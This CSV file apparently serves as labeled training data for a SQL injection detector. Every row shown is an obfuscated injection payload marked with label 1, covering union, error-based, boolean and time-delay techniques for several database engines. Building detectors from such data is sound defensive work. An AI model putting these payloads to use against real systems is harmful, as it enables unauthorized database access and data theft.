Query,Label
"1   )    )     )   %%or row  (  1045,7562  )  >  (  se%le%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  se%le%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%%or  (  ra%%nd  (  0  )  *2   )    )   x %%f%%r%o%%m   (  se%le%c%%t 8488 %%u%%n%i%on se%le%c%%t 5584 %%u%%n%i%on se%le%c%%t 3051 %%u%%n%i%on se%le%c%%t 1210  )  a group b%y x  )   a%%nd    (    (     (  1782  =  1782",1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%se%le%ct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""hrkf"" %%l%%ik%e ""hrkf",1
-9358' or 9887  =  2569--,1
"1""  )   as evoq %w%h%ere 8193  =  8193 %%or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%u%ll  )  --",1
-7426' %%o%%r%%d%er b%%y 1#,1
"1   )    )    as dnwj w%h%%e%r%e 2961  =  2961 %%a%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%%ll  )  ,0  )  ,500000000  )  ,%%n%%u%%ll  )  --",1
-9264'  )   %o%r 8571  =  8571--,1
-5291'   )    )    %%or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%l%ec%%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a%nd    (    (   'tmpm'  =  'tmpm,1
"-4015"" whe%%r%%e 2610  =  2610 or 1 group %%b%%y concat  (  0x7171706a71,  (  %s%%e%le%c%t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  r%%a%%nd  (  0  )  *2   )    )    having min  (  0  )  #",1
"1  )   %o%%r   (  s%%e%l%ec%t 2*  (  if   (    (   s%%e%l%ec%t * %%f%%rom   (  s%%e%l%ec%t concat  (  0x7171706a71,  (  s%%e%l%ec%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
1'   )    )     )   %a%%nd 7533  =  7533 %a%%nd    (    (     (  'suzd' l%i%k%e 'suzd,1
"-6626%""  )   o%%r 1744  =  5292 %%a%%n%d   (  ""%""  =  """,1
"1  )   as wxms %wh%%ere 7272  =  7272 an%d 3707  =    (  s%%e%l%ec%t count  (  *  )   %fro%%m sysibm.systab%l%%es as t1,sysibm.systab%l%%es as t2,sysibm.systab%l%%es as t3  )  --",1
1  )   w%%h%e%%r%e 7552  =  7552 %o%r%%d%e%%r %b%%y 1#,1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   a%n%d   (  'szib' %lik%%e 'szib",1
"1'  )   as hats wh%e%%r%%e 2011  =  2011 u%%n%i%%on all %%s%%e%le%%c%%t %%n%ul%l,%%n%ul%l,%%n%ul%l,%%n%ul%l,%%n%ul%l#",1
1'||  (  %s%e%%l%%e%%ct 'tznb' %fro%%m dual w%%he%%re 8808  =  8808 rl%i%k%%e   (  %s%e%%l%%e%%ct * %fro%%m   (  %s%e%%l%%e%%ct  (  sleep  (  5   )    )     )  vwyq  )  #,1
-2174'   )    )    as zhoz %w%he%r%e 4185  =  4185 %%%%o%r%d%er %b%y 1#,1
1'   )    )     )   %a%%n%d 3602  =  1990#,1
"1  )   %%w%h%%e%re 1013  =  1013 %%a%nd 4241  =  convert  (  %i%nt,  (  s%%e%le%ct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%%e%le%ct   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1'+  (  s%%elec%t soqk %w%h%%e%r%e 5383  =  5383,1
"1'   )    )     )   %%an%d elt  (  9501  =  8427,8427  )   %%an%d    (    (     (  'ahpp'  =  'ahpp",1
"1""   )    )    %%a%n%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1'||  (  %%s%%ele%c%t 'jlka' w%h%e%re 5436  =  5436 o%r 4915  =    (  %%s%%ele%c%t count  (  *  )   f%r%o%m doma%i%n.doma%i%ns as t1,doma%i%n.columns as t2,doma%i%n.%ta%b%%les as t3  )  --",1
"-4960 %%unio%%n all %select 4031,4031#",1
"1"" %%w%her%%e 1719  =  1719 and 7533  =  7533--",1
"-5798"" %%o%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%l%%ec%t   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %f%%r%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1'   )    )     )   a%n%d %up%d%%at%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  sel%e%c%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   a%n%d    (    (     (  'gwew' l%%ik%e 'gwew",1
s%%e%%l%%ec%t sleep  (  5  )  #,1
"1"" %w%her%e 5440  =  5440 %a%n%d 8189  =    (  %%se%lec%%t count  (  *  )   %%fr%om sysibm.sys%%t%a%b%l%%es as t1,sysibm.sys%%t%a%b%l%%es as t2,sysibm.sys%%t%a%b%l%%es as t3  )  --",1
"1' wh%%e%%r%e 7353  =  7353 %or 8156  =    (  %%s%e%%l%%ec%t count  (  *  )   f%rom generate_series  (  1,5000000   )    )   --",1
-3496'   )    )    %%o%r 9323  =  9323#,1
1%'   )    )     )   a%n%d 3916  =  6327--,1
"1"" %an%%d 3754  =    (  %s%e%l%ect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%l%ect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%f%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%ro%m dual  )   %an%%d ""exgr"" li%%k%e ""exgr",1
"-1376%""   )    )     )   %%or 3458  =  9503 %%a%n%%d    (    (     (  ""%""  =  """,1
"1%"" an%d 8189  =    (  %%s%%e%l%e%%c%t count  (  *  )   f%%r%om sysibm.sys%t%%a%%bl%es as t1,sysibm.sys%t%%a%%bl%es as t2,sysibm.sys%t%%a%%bl%es as t3  )  --",1
"1'   )    )     )   %%a%nd   (  %%se%%le%%ct 9067 %fr%%o%m  (  %%se%%le%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %%se%%le%%ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%%a%nd  (  0  )  *2   )    )   x %fr%%o%m i%%nf%o%rmation_schema.character_%s%%ets group %b%y x  )  a  )   %%a%nd    (    (     (  'wzdo'  =  'wzdo",1
1'   )    )    as vdhw %%w%h%e%r%%e 8858  =  8858 o%rde%%r %b%%y 1#,1
1  )   wh%%e%r%%e 8232  =  8232 %%a%nd   (  3020  =  3020  )  *6703--,1
"1""  )   whe%r%%e 6018  =  6018 an%d 7533  =  7533--",1
"1  )   %or 8384  =  %%l%i%%ke  (  'abcdefg',upper  (  hex  (  r%an%%domblob  (  500000000/2   )    )      )    )    %an%%d   (  9112  =  9112",1
-5555   )    )    as ldte w%%h%%e%re 4583  =  4583 %o%r%de%%r %b%%y 1#,1
-1886' %%wh%e%%r%e 5518  =  5518 %%o%r 4493  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%le%%c%%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1%""   )    )     )   %and 3580  =    (  s%e%%le%c%%t count  (  *  )   %fr%o%%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%%t%a%bl%es as t3  )  --",1
"1'   )    )    as atpy %wher%%e 9020  =  9020 %o%%r 4915  =    (  %se%%le%ct count  (  *  )   f%r%om domai%%n.domai%%ns as t1,domai%%n.columns as t2,domai%%n.ta%b%les as t3  )  --",1
"1%'  )   a%%nd 2716  =    (  %%s%%e%l%%e%c%%t count  (  *  )   %f%rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1' %%un%io%%n all %s%ele%%ct %n%%u%l%l#,1
"1' %a%nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   %a%nd 'hzav'  =  'hzav",1
1'||  (  %s%%el%%e%c%t 'zccb' f%r%%om dual whe%r%e 8911  =  8911,1
"-3137'||  (  %%se%%l%ect 'btif' %w%h%%e%%re 1718  =  1718 %%u%%nion all %%se%%l%ect 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1
"-3819'   )    )     )   %u%nio%%n all %se%%l%%e%%c%t 9014,9014,9014,9014,9014,9014--",1
"1%'   )    )    %%or 2367  =    (  s%e%%l%%e%ct count  (  *  )   %f%r%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1' w%h%e%r%%e 4149  =  4149 and 3202  =  l%%ike  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1  )   an%d 8407  =    (  %s%el%%e%%ct count  (  *  )   fr%%om generate_series  (  1,5000000   )    )   ",1
1 %wh%e%r%%e 2382  =  2382,1
"-2276""   )    )    as qwow %w%%here 2321  =  2321 %o%%r 3534  =  2971--",1
%s%e%%l%e%%c%t   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as %i%%nt  )  /  (  %s%e%%l%e%%c%t 0 %f%%ro%m dual  )   end  )   %f%%ro%m dual--,1
"1""  )   %w%her%e 5129  =  5129 %%or%de%%r %%b%%y 1--",1
1 %%w%%h%e%re 9404  =  9404,1
1'  )   %w%%h%er%e 7252  =  7252,1
"sel%ec%t count  (  *  )   f%rom doma%i%%n.doma%i%%ns as t1,doma%i%%n.columns as t2,doma%i%%n.%tabl%es as t3 %%an%d   (  'fnon' %%l%%i%ke 'fnon",1
1  )   as nsdy %%where 7513  =  7513,1
"-9337  )   u%%ni%on all s%%e%l%e%%ct 5648,5648,5648,5648,5648#",1
"-2734'  )   %un%io%%n all s%%el%%e%ct 5510,5510,5510,5510,5510#",1
"1""  )   as vcir %w%h%%e%r%e 6275  =  6275 %%a%n%%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%null  )  --",1
"-7559"" %%o%%r 8792  =  6905--",1
"1' %an%d 8407  =    (  se%%le%%c%%t count  (  *  )   %%f%%ro%%m generate_series  (  1,5000000   )    )    %an%d 'zetf'  =  'zetf",1
"iif  (  8354  =  3515,1,1/0  )  ",1
"-2612""  )   as iwfj %%w%%h%%e%r%e 3231  =  3231 %or 4493  =  utl_i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%el%ec%%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %%f%%rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"1'   )    )    and 8514  =    (  %%se%%l%e%%c%%t count  (  *  )   %%f%%r%om doma%i%n.doma%i%ns as t1,doma%i%n.columns as t2,doma%i%n.t%%ab%%l%%es as t3  )   and    (    (   'ygfv'  =  'ygfv",1
"%se%%l%e%c%%t %l%i%ke  (  'abcdefg',upper  (  hex  (  ran%domblob  (  500000000/2   )    )      )    )    an%d    (    (     (  '%'  =  '",1
"-7945%'   )    )     )   %u%%n%i%%o%n all %%s%ele%ct 4286,4286,4286,4286,4286,4286--",1
"-5998%""  )   %%u%ni%%o%%n all s%e%%le%%c%t 2366,2366,2366,2366#",1
"1'||  (  %%s%%e%lec%t 'wqmz' %%w%h%%e%%r%e 6400  =  6400 %%a%nd row  (  6237,7469  )  >  (  %%s%%e%lec%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%e%lec%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%%or  (  r%%a%nd  (  0  )  *2   )    )   x %%fr%%o%m   (  %%s%%e%lec%t 5192 u%%n%i%o%n %%s%%e%lec%t 3785 u%%n%i%o%n %%s%%e%lec%t 3931 u%%n%i%o%n %%s%%e%lec%t 7158  )  a group b%y x   )    )   ||'",1
"1,  (  %%se%%l%ec%t * %f%%r%om generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   l%%im%i%t 1  )  ",1
"-6129 %u%n%i%o%n all sel%e%%c%%t 9122,9122#",1
"1'   )    )     )   a%n%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%el%e%c%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   fr%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a%n%d    (    (     (  'qfvg'  =  'qfvg",1
"s%e%%le%%ct count  (  *  )   f%r%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 %a%%n%%d    (    (   ""swec"" li%%k%e ""swec",1
"1""   )    )    r%%l%%ik%%e sleep  (  5  )   %a%%n%%d    (    (   ""ahhx"" %%l%%ik%%e ""ahhx",1
"1  )   %%wh%e%r%e 7600  =  7600 %u%%ni%%o%%n all se%le%%c%t null,null,null,null,null,null--",1
"1' %i%%n boolean mode  )   a%%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%u%l%l  )  ,0  )  ,500000000  )  ,n%u%l%l  )  #",1
1%'   )    )     )   rlike   (  s%%e%le%%c%%t * %f%ro%m   (  s%%e%le%%c%%t  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-5945'   )    )     )   u%n%i%%o%%n all %%sel%e%%ct 4266,4266,4266,4266,4266--",1
"1 %wh%%e%r%e 2674  =  2674 %a%%nd 8514  =    (  %%se%%l%ect count  (  *  )   %%f%r%%o%m domain.domains as t1,domain.columns as t2,domain.%%t%ab%%l%es as t3  )  --",1
"1""  )   as rcnk %w%%h%%ere 1800  =  1800",1
"-2701""   )    )    as wvht %w%%her%e 5401  =  5401 %%u%ni%%o%%n all %s%%el%%ec%t 5401,5401,5401,5401,5401,5401,5401,5401#",1
"se%%l%e%c%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %%an%%d    (    (   ""vcvb"" %%l%i%%ke ""vcvb",1
"call regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%ull  )  ,0  )  ,500000000  )  ,n%%ull  )   %%a%%n%d   (  8503  =  8503",1
"-9688%'   )    )     )   o%%r elt  (  3695  =  7995,7995  )   %a%n%d    (    (     (  '%'  =  '",1
"1   )    )     )   %%o%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    %a%%n%%d    (    (     (  8671  =  8671",1
1   )    )    as ewlg w%%h%ere 3722  =  3722 rli%ke sleep  (  5  )  --,1
 (  %s%%el%ect 2412  =    (  'qqpjq'||  (  %s%%el%ect case 2412 when 2412 then 1 else 0 end %fr%%om rdb$%d%a%%ta%%b%a%%s%%e  )  ||'qzvzq'   )    ) ,1
-6890'   )    )    %or 5771  =  7721--,1
if  (  9431  =  6730  )   sele%c%%t 9431 else %%d%%r%o%p function xbkh--,1
"1""  )   %%wh%%e%%r%e 4739  =  4739 %o%%r   (  %s%e%%l%%e%c%%t 2*  (  if   (    (   %s%e%%l%%e%c%%t * from   (  %s%e%%l%%e%c%%t concat  (  0x7171706a71,  (  %s%e%%l%%e%c%%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1' o%r   (  %s%%e%l%e%ct 2*  (  if   (    (   %s%%e%l%e%ct * %f%r%%o%m   (  %s%%e%l%e%ct concat  (  0x7171706a71,  (  %s%%e%l%e%ct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1""  )   %%a%n%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %%a%n%d   (  ""vxec"" %l%%i%%ke ""vxec",1
"1' o%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    a%nd 'eznq' lik%e 'eznq",1
1'||  (  %%s%%e%%le%c%%t 'hwdj' %%wh%ere 8179  =  8179,1
1  )   as usnn w%%h%e%%re 3201  =  3201,1
%s%%e%%l%%ec%t   (  case when   (  9816  =  1693  )   then 9816 else cast  (  1 as %i%nt  )  /  (  %s%%e%%l%%ec%t 0 %%f%r%%o%%m dual  )   end  )   %%f%r%%o%%m dual--,1
"1%""  )   a%%nd 8715  =  5529",1
"1%'  )   %%o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%n%u%l%l  )  --",1
"1   )    )     )   %uni%%on all se%%l%%ect %nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll#",1
"1  )   %w%h%%e%%r%%e 3076  =  3076 u%%n%%i%%o%n all %se%%le%%c%t n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l--",1
%se%%le%%c%%t   (  case when   (  9931  =  3424  )   then 1 else 9931*  (  %se%%le%%c%%t 9931 fr%%o%m master..sys%d%%a%%t%a%b%as%%es  )   end  )  --,1
"1""  )   %a%n%%d 6240  =    (  'qqpjq'||  (  sel%%e%%c%%t case 6240 when 6240 then 1 else 0 end %from rdb$%%da%ta%%b%ase  )  ||'qzvzq'  )   %a%n%%d   (  ""liar""  =  ""liar",1
1'+  (  %%sel%e%%c%t tzvm w%%he%r%%e 5145  =  5145 %%and 4192  =  7437#,1
"1""   )    )    as ydkd %w%h%e%%r%e 2455  =  2455 a%nd sleep  (  5  )  --",1
"-4148%""   )    )     )   %%o%r   (  8459  =  8459  )  *4906 a%%n%%d    (    (     (  ""%""  =  """,1
end %an%d   (  'nchh'  =  'nchh,1
1' %%or sleep  (  5  )  #,1
"1""  )   %%o%r elt  (  6272  =  6272,sleep  (  5   )    )    a%%nd   (  ""dplf"" %li%%k%e ""dplf",1
-7239' %o%%r 5903  =    (  'qqpjq'||  (  %s%%e%l%%e%%ct case 5903 when 5903 then 1 else 0 end f%r%o%%m rdb$%d%%a%%t%%a%ba%%s%e  )  ||'qzvzq'  )   %%an%%d 'cswv'  =  'cswv,1
"1'||  (  s%%e%lect 'xhqy' %wh%e%%re 4531  =  4531 uni%o%n all s%%e%lect %%n%%ul%l,%%n%%ul%l--",1
"-6746""  )   %%or   (  8459  =  8459  )  *4906 %a%nd   (  ""kohi"" %%l%%i%ke ""kohi",1
"-6667%""   )    )    %%u%nio%%n all %select 7348,7348,7348,7348,7348,7348,7348,7348#",1
"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%ul%l  )  ,0  )  ,500000000  )  ,%n%ul%l  )   %and '%'  =  '",1
1'||  (  %%sele%c%%t 'yuku' %w%h%%er%%e 7480  =  7480,1
"1'  )   %u%%n%io%%n all %%s%e%%l%%ect n%%u%%ll,n%%u%%ll,n%%u%%ll,n%%u%%ll--",1
"-8319""   )    )    %o%%r 7878  =  5970 an%d    (    (   ""jcaz"" %%l%%i%k%e ""jcaz",1
%se%le%%c%t case when 8975  =  2352 then 1 else %null end--,1
"1%""  )   %%a%%n%d 8148  =  %l%ike  (  'abcdefg',upper  (  hex  (  r%%a%%n%domblob  (  500000000/2   )    )      )    )   --",1
"1%'   )    )     )   u%%n%i%%on all se%%le%ct %n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll#",1
"1   )    )     )   %o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%%u%l%l  )   %a%%n%d    (    (     (  6583  =  6583",1
"1'   )    )     )   o%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1' a%nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    a%nd 'hmqq'  =  'hmqq",1
waitfo%%r delay '0:0:5' %%an%d    (    (   7619  =  7619,1
1'  )   w%%he%r%%e 4729  =  4729,1
"1"" w%h%%e%re 9973  =  9973 %a%nd 2006  =  2006",1
"-3954'   )    )    %u%%ni%%o%n all %%se%%l%%ec%t 2417,2417--",1
"1'   )    )    %%u%n%i%on all %%select %%nul%%l,%%nul%%l,%%nul%%l,%%nul%%l--",1
1'+  (  %%s%%e%l%%e%c%t 'njee' w%h%%ere 4101  =  4101 %%a%nd 3090  =  7873  )  +',1
"1""   )    )    as tybm whe%r%%e 2687  =  2687 o%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-6593""  )   %%un%%i%%o%%n all se%%le%ct 6216,6216,6216,6216,6216,6216,6216#",1
"1""  )   a%%n%d make_%%s%e%%t  (  4539  =  6401,6401  )   a%%n%d   (  ""kglx""  =  ""kglx",1
1'  )   and 7290  =  8416 and   (  'ktlz' li%%k%e 'ktlz,1
"-8472'  )   w%%h%%er%e 3340  =  3340 or make_%%se%t  (  1752  =  9905,9905  )  --",1
"1""  )   %w%he%re 9770  =  9770 u%%n%%ion all s%e%l%%e%ct %nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l--",1
"1'+  (  %s%e%le%%ct ocvc %w%h%ere 6981  =  6981 %u%n%i%o%n all %s%e%le%%ct nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l#",1
"1   )    )    %%u%ni%%on all se%%lect %%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l,%%n%%ul%l--",1
"-6214"" unio%n all %s%e%l%e%%c%%t 3323,3323#",1
-7979'+  (  %s%%e%%l%%e%%c%t 'bkvt' %w%%h%%e%r%e 3613  =  3613 %%u%%n%%i%%o%%n all %s%%e%%l%%e%%c%t 3613#,1
"1'||  (  s%%e%%lec%%t 'ymwf' %w%h%e%re 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%n%ul%%l   )    )   ||'",1
%%s%%el%%e%%ct sleep  (  5  )   %an%d    (    (   3404  =  3404,1
1'||  (  %%s%%e%%lec%%t 'fjlg' fro%m dual w%%h%%e%%r%e 9517  =  9517,1
"1   )    )     )   an%d 2716  =    (  %%s%%e%%l%ec%t count  (  *  )   %%f%%r%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-3879' %%u%n%i%%o%n all s%e%%l%ec%%t 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1
"1%""  )   un%%ion all s%e%l%%e%c%t %%nu%l%l--",1
"1' %o%%r 8421  =    (  %s%el%%ect count  (  *  )   %%f%rom generate_series  (  1,5000000   )    )    %%a%%nd 'jiyx'  =  'jiyx",1
"1%""   )    )     )   %%an%d 3754  =    (  %s%el%e%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%el%e%c%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   f%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f%r%%om dual  )   %%an%d    (    (     (  ""%""  =  """,1
"-2085""  )   as hkev %%whe%r%%e 7730  =  7730 %%u%nio%n all s%e%l%e%%c%t 7730,7730--",1
"1' %in boolean mode  )   %a%%nd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%ing  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%nu%l%%l  )  --",1
1%'  )   an%%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %se%%l%e%ct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   an%%d   (  '%'  =  ',1
"1%' o%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1 %w%h%e%r%%e 8398  =  8398,1
%se%%l%e%%c%t   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  %se%%l%e%%c%t 8808 %%f%r%o%%m master..sys%%d%a%%t%ab%a%s%%es  )   end  )  --,1
%%sele%c%%t   (  case when   (  7096  =  2568  )   then 7096 else 1/  (  %%sele%c%%t 0  )   end  )  --,1
"1%' %u%n%%i%o%%n all %%s%ele%c%t n%%ull,n%%ull,n%%ull,n%%ull,n%%ull,n%%ull,n%%ull#",1
-1375'   )    )     )   %or   (  1226  =  9648  )  *9648 %%a%%n%%d    (    (     (  'kfoy' %%l%%i%%ke 'kfoy,1
"%%s%%e%le%%ct count  (  *  )   fro%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 an%%d    (    (     (  1105  =  1105",1
"1""   )    )    as dshc w%he%%r%%e 9911  =  9911 %o%r 1022  =    (  %%s%%e%%l%ec%%t count  (  *  )   %fr%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
